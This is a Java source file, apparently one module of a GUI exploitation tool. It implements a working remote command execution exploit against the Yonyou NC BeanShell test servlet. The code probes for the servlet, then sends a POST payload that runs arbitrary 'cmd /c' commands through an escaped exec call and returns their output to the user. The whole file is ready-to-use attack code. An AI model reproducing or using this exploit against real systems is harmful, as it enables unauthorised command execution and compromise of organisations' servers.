package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;

import java.util.HashMap;

public class yongyou_nc_BshServlet_RCE implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea,TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
//        return null;
    }


    private Boolean att(String url, TextArea textArea) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response get_res = HttpTools.get(url + "/servlet/~ic/bsh.servlet.BshServlet" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("BeanShell Test Servlet")) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_nc_BshServlet_RCE ]");
                    textArea.appendText("\n 输入CMD进行测试");
                    textArea.appendText("\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_BshServlet_RCE-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        try {
            Response cmd_echo = HttpTools.post(url + "/servlet/~ic/bsh.servlet.BshServlet", "bsh.script=ex%5Cu0065c%28%22cmd+%2Fc+"+cmd+"%22%29%3B"
                    , new HashMap<String, String>(), "utf-8");

            String result = cmd_echo.getText();
            String resultlist = getIndexOf.getMessage_useStr(result,"Script Output",3,"Script Return Value",-5);



            if (resultlist != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行成功！");
                    textArea_cmd.appendText("\n"+resultlist);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_BshServlet_RCE-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    //
}
